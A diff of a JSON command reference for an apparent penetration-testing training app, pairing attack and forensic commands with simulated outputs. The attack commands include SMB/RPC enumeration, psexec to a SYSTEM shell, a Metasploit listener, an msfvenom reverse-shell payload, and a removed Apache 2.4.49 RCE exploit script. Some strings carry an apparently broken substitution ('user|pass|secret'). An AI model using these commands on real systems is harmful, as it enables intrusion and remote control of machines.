+            "simulation": "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.01s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum: \n|   /admin/: Possible admin folder\n|   /login.php: Possible admin login page\n|   /robots.txt: Robots.txt found\n| http-csrf:\n|   Found the following possible CSRF vulnerabilities: \n|     Path: http://192.168.1.1/login.php\n|     Form id: loginForm\n\nNmap done: 1 IP address (1 host up) scanned in 15.5 seconds"
+          },
           {
             "command": "smbclient -L \\\\\\\\<IP>",
             "description": "List anonymous shares",
-            "simulation": "Enter WORKGROUP\\minal's password: \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        ADMIN$          Disk      Admin share\n        IPC$            IPC       IPC Service (Windows Server)\n        Data            Disk      Public Data Share\n        Users           Disk      User Home Directories\n\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n        DC01                 Primary Domain Controller\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            DC01"
+            "simulation": "Enter WORKGROUP\\minal's password: \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        ADMIN$          Disk      Admin share\n        IPC$            IPC       IPC Service (Windows Server)\n        Data            Disk      Public Data Share\n        Users           Disk      User Home Directories"
           },
           {
             "command": "enum4linux -a <IP>",
             "description": "Full SMB enumeration sweep",
-            "simulation": "Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ )\non 10.35.62.230\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.35.62.230\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n =================================================== \n|    Enumerating Workgroup/Domain on 10.35.62.230   |\n =================================================== \n[+] Got domain/workgroup name: WORKGROUP\n\n =========================================== \n|    Nbtstat Information for 10.35.62.230   |\n =========================================== \nLooking up status of 10.35.62.230\n    DC01            <00> -         B <ACTIVE>  Workstation Service\n    DC01            <20> -         B <ACTIVE>  File Server Service\n\n ==================================== \n|    Session Check on 10.35.62.230   |\n ==================================== \n[+] Server 10.35.62.230 allows sessions using username '', password ''\n\n ========================================== \n|    Getting domain SID for 10.35.62.230   |\n ========================================== \nDomain Name: WORKGROUP\nDomain Sid: S-1-5-21-123456789-1234567890-123456789\n\n[+] Enumeration Complete"
+            "simulation": "Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ )\non 10.35.62.230\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.35.62.230\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n[+] Got domain/workgroup name: WORKGROUP\n[+] Enumeration Complete"
           },
           {
             "command": "rpcclient -U \"\" <IP>",
             "description": "Anonymous RPC Login",
-            "simulation": "Enter WORKGROUP\\'s password:\nrpcclient $> enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[minal] rid:[0x3e8]\nrpcclient $> queryuser minal\n        User Name   :   minal\n        Full Name   :   Minal Hasan\n        Home Drive  :   C:\n        Dir Drive   :   C:\\Users\\minal\n        Profile Path:\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :       Thu, 30 Apr 2026 10:00:00 GMT\n        Logoff Time              :       never"
+            "simulation": "Enter WORKGROUP\\'s password:\nrpcclient $> enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[minal] rid:[0x3e8]\nrpcclient $> queryuser minal\n        User Name   :   minal\n        Full Name   :   Minal Hasan"
           },
           {
-            "command": "smbmap -H <IP> -u admin -p pass",
-            "description": "Enumerate shares with creds",
-            "simulation": "[+] IP: 10.35.62.230:445        Name: DC01                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Admin share\n        C$                                                      NO ACCESS       Default share\n        Data                                                    READ, WRITE     Public Data Share\n        IPC$                                                    READ ONLY       IPC Service\n        Users                                                   READ ONLY       User Home Directories"
+            "command": "wpscan --url http://<IP> --enumerate u,vp,vt",
+            "description": "Scan WordPress for vulnerabilities",
+            "simulation": "WordPress Security Scanner by the WPScan Team\n[+] URL: http://10.35.62.230/\n[i] User(s) Identified:\n[+] admin\n[i] Plugin(s) Identified:\n[+] contact-form-7"
+          },
+          {
+            "command": "cewl -w wordlist.txt -d 5 -m 5 http://<IP>",
+            "description": "Generate custom wordlist from site",
+            "simulation": "CeWL 5.4.8 (Inclusion) by Robin Wood (robin@digi.ninja)\n[+] Target URL: http://10.35.62.230\n[+] Unique words found: 842\n[+] Words saved to wordlist.txt successfully."
+          }
+        ]
+      },
+      {
+        "name": "04 Exploit: Gaining Access",
+        "description": "Leverage known exploits and frameworks to gain an initial foothold on the target system.",
+        "commands": [
+          {
+            "command": "searchsploit apache 2.4.49",
+            "description": "Search Exploit-DB by name/version",
+            "simulation": "------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                          |  Path\n------------------------------------------------------------------------ ---------------------------------\nApache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)| linux/remote/50383.sh\nApache HTTP Server 2.4.49/2.4.50 - Path Traversal & Remote Code Executi | linux/remote/50406.py\n------------------------------------------------------------------------ ---------------------------------"
           },
           {
             "command": "python3 psexec.py admin@<IP>",
             "description": "Gain shell via Impacket psexec",
             "usage": "Requires valid admin credentials and ADMIN$ share access.",
-            "simulation": "Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Requesting shares on 10.35.62.230.....\n[*] Found writable share ADMIN$\n[*] Uploading file kKjHwQwE.exe\n[*] Opened SVCManager on 10.35.62.230.....\n[*] Creating service kKjHwQwE.....\n[*] Starting service kKjHwQwE.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.19042.928]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nnt authority\\system\n\nC:\\Windows\\system32>"
-          }
-        ]
-      },
-      {
-        "name": "WordPress & CMS",
-        "description": "Targeting common content management systems.",
-        "commands": [
-          {
-            "command": "wpscan --url http://<IP> --enumerate u,vp,vt",
-            "description": "Scan WordPress for vulnerabilities",
-            "simulation": "_______________________________________________________________\n         __          _______   _____ \n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\ \n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                       Version 3.8.22\n_______________________________________________________________\n\n[+] URL: http://10.35.62.230/\n[+] Started: Thu Apr 30 00:00:00 2026\n\n[i] Updating the Database ...\n[i] Update completed.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:02 <=====================> (10 / 10) 100.00% Time: 00:00:02\n\n[i] User(s) Identified:\n[+] admin\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] Plugin(s) Identified:\n[+] contact-form-7\n | Location: http://10.35.62.230/wp-content/plugins/contact-form-7/\n | Latest Version: 5.4.1\n | Last Updated: 2021-05-20T10:05:00.000Z\n | Readme: http://10.35.62.230/wp-content/plugins/contact-form-7/readme.txt\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:05 <====================> (400 / 400) 100.00% Time: 00:00:05\n[i] No themes found.\n\n[+] Finished: Thu Apr 30 00:00:15 2026\n[+] Requests Done: 452\n[+] Data Sent: 1.2 MB\n[+] Data Received: 3.4 MB"
+            "simulation": "[*] Requesting shares on 10.35.62.230.....\n[*] Found writable share ADMIN$\n[*] Uploading file kKjHwQwE.exe\nMicrosoft Windows [Version 10.0.19042.928]\nC:\\Windows\\system32>whoami\nnt authority\\system"
           },
           {
-            "command": "cewl -w wordlist.txt -d 5 -m 5 http://<IP>",
-            "description": "Generate custom wordlist from site",
-            "usage": "Crawl the website to create a list of words for password attacks.",
-            "simulation": "CeWL 5.4.8 (Inclusion) by Robin Wood (robin@digi.ninja) (https://digi.ninja/)\n\n[+] Spiders started\n[+] Target URL: http://10.35.62.230\n[+] Depth: 5\n[+] Minimum word length: 5\n[+] Saving words to: wordlist.txt\n\n[+] Spidering 10.35.62.230\n[+] Found 15 links to follow\n[+] Spidering 10.35.62.230/about.php\n[+] Spidering 10.35.62.230/contact.php\n[+] Spidering 10.35.62.230/products.php\n...\n[+] Finished spidering\n[+] Unique words found: 842\n[+] Words saved to wordlist.txt successfully."
-          }
-        ]
-      },
-      {
-        "name": "Exploit Search",
-        "description": "Finding known exploits for identified services.",
-        "commands": [
-          {
-            "command": "searchsploit apache 2.4.49",
-            "description": "Search Exploit-DB by name/version",
-            "simulation": "------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                          |  Path\n------------------------------------------------------------------------ ---------------------------------\nApache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)| linux/remote/50383.sh\nApache HTTP Server 2.4.49/2.4.50 - Path Traversal & Remote Code Executi | linux/remote/50406.py\n------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results"
+            "command": "msfconsole -q -x \"use exploit/multi/handler; set LHOST 10.10.10.10; set LPORT 4444; run\"",
+            "description": "Start a Metasploit multi-handler listener",
+            "simulation": "[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 10.10.10.10:4444 "
           },
           {
-            "command": "searchsploit -x 12345.txt",
-            "description": "Examine exploit source code",
-            "simulation": "  Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)\n      URL: https://www.exploit-db.com/exploits/50383\n     Path: /usr/share/exploitdb/exploits/linux/remote/50383.sh\nFile Type: POSIX shell script, ASCII text executable\n\n#!/bin/bash\n# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)\n# Date: 10/05/2021\n# Exploit Author: ...\n\nif [[ $1 == '' ]]; then\n    echo \"Usage: ./exploit.sh <target-ip> <command>\"\n    exit 1\nfi\n\ncurl -s --path-as-is -d \"echo Content-Type: text/plain; echo; $2\" \"http://$1/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh\""
+            "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf",
+            "description": "Generate a reverse shell payload",
+            "simulation": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\nPayload size: 129 bytes\nSaved as: shell.elf"
           }
         ]
       }
@@ -683,7 +980,7 @@
           { "command": "ls -alR /proc/*/exe 2>/dev/null | grep deleted", "description": "[CRITICAL] Detect malware attempting to hide by deleting binaries (Deleted Executables Still Running)", "simulation": "lrwxrwxrwx 1 root root 0 Apr 30 12:00 /proc/1234/exe -> /tmp/malware (deleted)" },
           { "command": "strings /proc/<PID>/cmdline", "description": "[HIGH] Reveal actual executed commands (Process Command Line Inspection)", "simulation": "./cryptominer\n-a\nrx\n-o\nstratum+tcp://pool.example.com:3333\n-u\nwallet_address" },
           { "command": "strings /proc/<PID>/comm", "description": "[HIGH] Reveal actual executed commands (Process Command Line Inspection)", "simulation": "cryptominer" },
-          { "command": "strings /proc/<PID>/environ", "description": "[MEDIUM] Detect injected environment variables or secrets (Process Environment Variables)", "simulation": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/tmp\nLOGNAME=root\nLD_PRELOAD=/tmp/libhide.so" },
+          { "command": "strings /proc/<PID>/environ", "description": "[MEDIUM] Detect injected environment variables or user|pass|secrets (Process Environment Variables)", "simulation": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/tmp\nLOGNAME=root\nLD_PRELOAD=/tmp/libhide.so" },
           { "command": "ls -al /proc/<PID>/exe", "description": "[CRITICAL] Verify actual binary location (Process Binary Path)", "simulation": "lrwxrwxrwx 1 root root 0 Apr 30 12:05 /proc/1234/exe -> /tmp/.hidden/nc" },
           { "command": "ls -alR /proc/*/cwd 2>/dev/null | grep tmp", "description": "[CRITICAL] Detect execution from temporary or unusual directories (Suspicious Working Directories)", "simulation": "lrwxrwxrwx 1 root root 0 Apr 30 12:10 /proc/1234/cwd -> /tmp/.hidden_dir" },
           { "command": "ls -alR /proc/*/cwd 2>/dev/null | grep dev", "description": "[CRITICAL] Detect execution from temporary or unusual directories (Suspicious Working Directories)", "simulation": "lrwxrwxrwx 1 root root 0 Apr 30 12:10 /proc/4567/cwd -> /dev/shm/.cache" }
@@ -694,7 +991,7 @@
         "description": "Inspect commonly abused directories for persistence or payload storage.",
         "commands": [
           { "command": "/tmp, /var/tmp, /dev/shm, /var/run, /var/spool, /home", "description": "[HIGH] Common malware drop locations (Targeted Directories)", "isReadOnly": true },
-          { "command": "find / -type d -name \".*\"", "description": "[MEDIUM] Identify hidden attacker directories (Hidden Directories)", "simulation": "/root/.ssh\n/home/minal/.cache\n/tmp/.X11-unix\n/dev/shm/.secret_miner" },
+          { "command": "find / -type d -name \".*\"", "description": "[MEDIUM] Identify hidden attacker directories (Hidden Directories)", "simulation": "/root/.ssh\n/home/minal/.cache\n/tmp/.X11-unix\n/dev/shm/.user|pass|secret_miner" },
           { "command": "ls -lap", "description": "[LOW] Reveal unusual naming patterns (List Files with Special Characters)", "simulation": "total 16\ndrwxr-xr-x 2 user user 4096 Apr 30 12:15 ./\ndrwxr-xr-x 3 user user 4096 Apr 30 12:00 ../\n-rw-r--r-- 1 user user  220 Apr 30 12:00 .bash_logout\n-rwxr-xr-x 1 user user 1024 Apr 30 12:15  \n-rw-r--r-- 1 user user   42 Apr 30 12:15 ..." }
         ]
       },
@@ -1437,129 +1734,6 @@
             "description": "OWASP Related Cheat Sheet",
             "isReadOnly": true
           }
-        ]
-      }
-    ],
-    "attackChain": [],
-    "challenges": []
-  },
-  {
-    "id": "linux-fundamentals",
-    "title": "Linux Fundamentals",
-    "difficulty": "Beginner",
-    "description": "Essential Linux commands and utilities for system administration and penetration testing.",
-    "concept": "Mastering Linux fundamentals is crucial for any cybersecurity professional. This module covers basic system navigation, file manipulation, user management, and network configuration.",
-    "tools": [
-      {
-        "name": "System Commands",
-        "description": "Basic commands to interact with the system.",
-        "commands": [
-          { "command": "man <tool>", "description": "Opens man pages for the specified tool.", "simulation": "man ls\nLS(1) User Commands LS(1)\n\nNAME\n       ls - list directory contents" },
-          { "command": "<tool> -h", "description": "Prints the help page of the tool.", "simulation": "Usage: ls [OPTION]... [FILE]...\nList information about the FILEs (the current directory by default)." },
-          { "command": "apropos <keyword>", "description": "Searches through man pages' descriptions for instances of a given keyword.", "simulation": "apropos network\nifconfig (8) - configure a network interface\ninterfaces (5) - network interface configuration" },
-          { "command": "cat", "description": "Concatenate and print files.", "simulation": "Hello, this is a test file.\nIt contains two lines." },
-          { "command": "whoami", "description": "Displays current username.", "simulation": "minal" },
-          { "command": "id", "description": "Returns users identity.", "simulation": "uid=1000(minal) gid=1000(minal) groups=1000(minal),27(sudo)" },
-          { "command": "hostname", "description": "Sets or prints the name of the current host system.", "simulation": "ligerverse-os" },
-          { "command": "uname", "description": "Prints operating system name.", "simulation": "Linux" },
-          { "command": "pwd", "description": "Returns working directory name.", "simulation": "/home/minal" },
-          { "command": "ifconfig", "description": "Assign or view an address to a network interface and/or configure network interface parameters.", "simulation": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.35.62.230  netmask 255.255.255.0  broadcast 10.35.62.255" },
-          { "command": "ip", "description": "Show or manipulate routing, network devices, interfaces, and tunnels.", "simulation": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever" },
-          { "command": "netstat", "description": "Shows network status.", "simulation": "Active Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 10.35.62.230:ssh       10.35.62.100:54321      ESTABLISHED" },
-          { "command": "ss", "description": "Another utility to investigate sockets.", "simulation": "Netid  State      Recv-Q Send-Q Local Address:Port       Peer Address:Port\ntcp    ESTAB      0      0      10.35.62.230:ssh         10.35.62.100:54321" },
-          { "command": "ps", "description": "Shows process status.", "simulation": "  PID TTY          TIME CMD\n12345 pts/0    00:00:00 bash\n12346 pts/0    00:00:00 ps" },
-          { "command": "who", "description": "Displays who is logged in.", "simulation": "minal    pts/0        2026-04-29 23:30 (10.35.62.100)" },
-          { "command": "env", "description": "Prints environment or sets and executes a command.", "simulation": "SHELL=/bin/bash\nPWD=/home/minal\nLOGNAME=minal\nHOME=/home/minal\nUSER=minal" },
-          { "command": "journalctl", "description": "Query the systemd journal.", "simulation": "-- Logs begin at Wed 2026-04-29 08:00:00 UTC, end at Wed 2026-04-29 23:45:00 UTC. --\nApr 29 08:00:01 ligerverse-os systemd[1]: Started System Logging Service." },
-          { "command": "kill", "description": "Sends a signal to a process.", "simulation": "[1]+  Terminated              sleep 1000" },
-          { "command": "bg", "description": "Puts a process into background.", "simulation": "[1]+ sleep 1000 &" },
-          { "command": "jobs", "description": "Lists all processes that are running in the background.", "simulation": "[1]+  Running                 sleep 1000 &" },
-          { "command": "fg", "description": "Puts a process into the foreground.", "simulation": "sleep 1000" },
-          { "command": "ls", "description": "Lists directory contents.", "simulation": "Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos" },
-          { "command": "cd", "description": "Changes the directory.", "simulation": "minal@ligerverse-os:~/Documents$" },
-          { "command": "clear", "description": "Clears the terminal.", "simulation": "\u001b[H\u001b[2J" },
-          { "command": "which", "description": "Returns the path to a file or link.", "simulation": "/usr/bin/python3" },
-          { "command": "find", "description": "Searches for files in a directory hierarchy.", "simulation": "/var/www/html/index.php\n/var/www/html/config.php" },
-          { "command": "updatedb", "description": "Updates the locale database for existing contents on the system.", "simulation": "minal@ligerverse-os:~$ sudo updatedb\n[sudo] password for minal: \nminal@ligerverse-os:~$" },
-          { "command": "locate", "description": "Uses the locale database to find contents on the system.", "simulation": "/usr/bin/locate\n/usr/share/man/man1/locate.1.gz" }
-        ]
-      },
-      {
-        "name": "Permission",
-        "description": "Managing file and directory permissions.",
-        "commands": [
-          { "command": "chmod", "description": "Changes permission of a file or directory.", "simulation": "minal@ligerverse-os:~$ chmod 755 script.sh\nminal@ligerverse-os:~$ ls -l script.sh\n-rwxr-xr-x 1 minal minal 42 Apr 29 23:45 script.sh" },
-          { "command": "chown", "description": "Changes the owner and group of a file or directory.", "simulation": "minal@ligerverse-os:~$ sudo chown root:root script.sh\nminal@ligerverse-os:~$ ls -l script.sh\n-rwxr-xr-x 1 root root 42 Apr 29 23:45 script.sh" }
-        ]
-      },
-      {
-        "name": "Packages & Repositories",
-        "description": "Installing and managing software packages.",
-        "commands": [
-          { "command": "dpkg", "description": "Install, remove and configure Debian-based packages.", "simulation": "minal@ligerverse-os:~$ dpkg -l | grep python3\nii  python3  3.10.6-1~22.04  amd64  interactive high-level object-oriented language" },
-          { "command": "apt", "description": "High-level package management command-line utility.", "simulation": "minal@ligerverse-os:~$ sudo apt update\nHit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\nReading package lists... Done" },
-          { "command": "aptitude", "description": "Alternative to apt.", "simulation": "minal@ligerverse-os:~$ aptitude search nmap\np   nmap - The Network Mapper" },
-          { "command": "snap", "description": "Install, remove and configure snap packages.", "simulation": "minal@ligerverse-os:~$ snap list\nName  Version  Rev   Tracking  Publisher  Notes\ncore  16-2.61  16202 latest/stable  canonical✓  core" },
-          { "command": "gem", "description": "Standard package manager for Ruby.", "simulation": "minal@ligerverse-os:~$ gem install wpscan\nSuccessfully installed wpscan-3.8.22\n1 gem installed" },
-          { "command": "pip", "description": "Standard package manager for Python.", "simulation": "minal@ligerverse-os:~$ pip install requests\nRequirement already satisfied: requests in /usr/lib/python3/dist-packages" },
-          { "command": "git", "description": "Revision control system command-line utility.", "simulation": "minal@ligerverse-os:~/repo$ git status\nOn branch main\nYour branch is up to date with 'origin/main'.\n\nnothing to commit, working tree clean" }
-        ]
-      },
-      {
-        "name": "Users & Groups Management",
-        "description": "Managing users, groups, and privileges.",
-        "commands": [
-          { "command": "sudo", "description": "Execute command as a different user.", "simulation": "minal@ligerverse-os:~$ sudo cat /etc/shadow\n[sudo] password for minal: \nroot:$6$xyz...:19000:0:99999:7:::" },
-          { "command": "su", "description": "Requests appropriate user credentials via PAM and switches to that user ID. A shell is then executed.", "simulation": "minal@ligerverse-os:~$ su -\nPassword: \nroot@ligerverse-os:~#" },
-          { "command": "useradd", "description": "Creates a new user or update default new user information.", "simulation": "root@ligerverse-os:~# useradd -m newuser\nroot@ligerverse-os:~# grep newuser /etc/passwd\nnewuser:x:1001:1001::/home/newuser:/bin/sh" },
-          { "command": "userdel", "description": "Deletes a user account and related files.", "simulation": "root@ligerverse-os:~# userdel -r olduser\nuserdel: olduser mail spool (/var/mail/olduser) not found" },
-          { "command": "usermod", "description": "Modifies a user account.", "simulation": "root@ligerverse-os:~# usermod -aG sudo minal\nroot@ligerverse-os:~# id minal\nuid=1000(minal) gid=1000(minal) groups=1000(minal),27(sudo)" },
-          { "command": "addgroup", "description": "Adds a group to the system.", "simulation": "root@ligerverse-os:~# addgroup developers\nAdding group 'developers' (GID 1002) ...\nDone." },
-          { "command": "delgroup", "description": "Removes a group from the system.", "simulation": "root@ligerverse-os:~# delgroup developers\nRemoving group 'developers' ...\nDone." },
-          { "command": "passwd", "description": "Changes user password.", "simulation": "Changing password for minal.\n(current) UNIX password: \nEnter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully" }
-        ]
-      },
-      {
-        "name": "Requests",
-        "description": "Transferring data over the network.",
-        "commands": [
-          { "command": "curl", "description": "Command-line utility to transfer data from or to a server.", "simulation": "HTTP/1.1 200 OK\nDate: Wed, 29 Apr 2026 18:00:00 GMT\nServer: Apache/2.4.41 (Ubuntu)\n..." },
-          { "command": "wget", "description": "An alternative to curl that downloads files from FTP or HTTP(s) server.", "simulation": "Resolving example.com (example.com)... 93.184.216.34\nConnecting to example.com (example.com)|93.184.216.34|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1256 (1.2K) [text/html]\nSaving to: 'index.html'" },
-          { "command": "python3 -m http.server", "description": "Starts a Python3 web server on TCP port 8000.", "simulation": "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..." }
-        ]
-      },
-      {
-        "name": "Lists",
-        "description": "Listing various system devices and files.",
-        "commands": [
-          { "command": "lsblk", "description": "Lists block devices.", "simulation": "NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT\nsda      8:0    0   100G  0 disk \n├─sda1   8:1    0   512M  0 part /boot/efi\n└─sda2   8:2    0  99.5G  0 part /" },
-          { "command": "lsusb", "description": "Lists USB devices.", "simulation": "Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub\nBus 001 Device 002: ID 8087:0a2a Intel Corp. Bluetooth wireless interface" },
-          { "command": "lsof", "description": "Lists opened files.", "simulation": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nbash     1234 minal  cwd    DIR  259,2     4096    2 /\nbash     1234 minal  rtd    DIR  259,2     4096    2 /" },
-          { "command": "lspci", "description": "Lists PCI devices.", "simulation": "00:00.0 Host bridge: Intel Corporation 8th Gen Core Processor Host Bridge\n00:02.0 VGA compatible controller: Intel Corporation UHD Graphics 620" }
-        ]
-      },
-      {
-        "name": "Directories & Files",
-        "description": "File manipulation and text processing.",
-        "commands": [
-          { "command": "touch", "description": "Creates an empty file.", "simulation": "minal@ligerverse-os:~$ touch newfile.txt\nminal@ligerverse-os:~$ ls -l newfile.txt\n-rw-rw-r-- 1 minal minal 0 Apr 29 23:50 newfile.txt" },
-          { "command": "mkdir", "description": "Creates a directory.", "simulation": "minal@ligerverse-os:~$ mkdir new_folder\nminal@ligerverse-os:~$ ls -ld new_folder\ndrwxrwxr-x 2 minal minal 4096 Apr 29 23:50 new_folder" },
-          { "command": "tree", "description": "Lists the contents of a directory recursively.", "simulation": ".\n├── dir1\n│   └── file1.txt\n└── dir2\n    └── file2.txt\n\n2 directories, 2 files" },
-          { "command": "mv", "description": "Move or rename files or directories.", "simulation": "minal@ligerverse-os:~$ mv oldname.txt newname.txt\nminal@ligerverse-os:~$ ls newname.txt\nnewname.txt" },
-          { "command": "cp", "description": "Copy files or directories.", "simulation": "minal@ligerverse-os:~$ cp file1.txt file2.txt\nminal@ligerverse-os:~$ ls file*.txt\nfile1.txt  file2.txt" },
-          { "command": "nano", "description": "Terminal based text editor.", "simulation": "  GNU nano 6.2                        file.txt\n\nThis is a text file edited in nano.\n\n\n^G Help      ^O Write Out ^W Where Is  ^K Cut       ^T Execute   ^C Location\n^X Exit      ^R Read File ^\\ Replace   ^U Paste     ^J Justify   ^_ Go To Line" },
-          { "command": "more", "description": "Pager that is used to read STDOUT or files.", "simulation": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n--More--(5%)" },
-          { "command": "less", "description": "An alternative to more with more features.", "simulation": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n~\n~\n(END)" },
-          { "command": "head", "description": "Prints the first ten lines of STDOUT or a file.", "simulation": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin" },
-          { "command": "tail", "description": "Prints the last ten lines of STDOUT or a file.", "simulation": "minal@ligerverse-os:~$ tail -n 2 /var/log/syslog\nApr 29 23:55:01 ligerverse-os CRON[3456]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)\nApr 29 23:56:01 ligerverse-os systemd[1]: Started Session 10 of user minal." },
-          { "command": "sort", "description": "Sorts the contents of STDOUT or a file.", "simulation": "minal@ligerverse-os:~$ sort names.txt\nAlice\nBob\nCharlie\nDave" },
-          { "command": "grep", "description": "Searches for specific results that contain given patterns.", "simulation": "root:x:0:0:root:/root:/bin/bash" },
-          { "command": "cut", "description": "Removes sections from each line of files.", "simulation": "minal@ligerverse-os:~$ cut -d':' -f1 /etc/passwd | head -n 3\nroot\ndaemon\nbin" },
-          { "command": "tr", "description": "Replaces certain characters.", "simulation": "minal@ligerverse-os:~$ echo \"hello\" | tr 'a-z' 'A-Z'\nHELLO" },
-          { "command": "column", "description": "Command-line based utility that formats its input into multiple columns.", "simulation": "minal@ligerverse-os:~$ mount | column -t\nsysfs        on  /sys                             type  sysfs       (rw,nosuid,nodev,noexec,relatime)\nproc         on  /proc                            type  proc        (rw,nosuid,nodev,noexec,relatime)" },
-          { "command": "awk", "description": "Pattern scanning and processing language.", "simulation": "minal@ligerverse-os:~$ awk -F: '{print $1}' /etc/passwd | head -n 3\nroot\ndaemon\nbin" },
-          { "command": "sed", "description": "A stream editor for filtering and transforming text.", "simulation": "minal@ligerverse-os:~$ echo \"I love apples\" | sed 's/apples/oranges/'\nI love oranges" },
-          { "command": "wc", "description": "Prints newline, word, and byte counts for a given input.", "simulation": "  42  150 1024 filename.txt" }
         ]
       }
     ],
